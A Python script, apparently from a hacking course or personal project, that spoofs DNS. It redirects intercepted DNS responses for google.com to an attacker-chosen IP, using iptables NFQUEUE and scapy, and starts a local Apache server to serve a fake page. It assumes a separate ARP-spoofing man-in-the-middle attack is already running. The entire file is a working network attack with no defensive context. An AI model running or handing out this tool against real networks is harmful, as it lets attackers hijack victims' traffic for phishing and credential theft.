# need to run arp_spoof.py with python3 before running this script as it does IP forwarding
import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    return options


def process_packet(packet):
    options = get_arguments()
    target_ip = options.target
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet is a DNS response
        # Now also check if it's a DNS query
            qname = scapy_packet[scapy.DNSQR].qname
            if "google.com" in str(qname):
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata=target_ip)
                scapy_packet[scapy.DNS].an = answer
                # set the number of answers to 1
                scapy_packet[scapy.DNS].ancount = 1
                # delete the length and checksum fields to recalculate them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["service", "apache2", "start"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush", shell=True)
    print("[+] IP tables flushed")
    subprocess.call("service apache2 stop", shell=True)
    print("[+] Stopping Apache server")
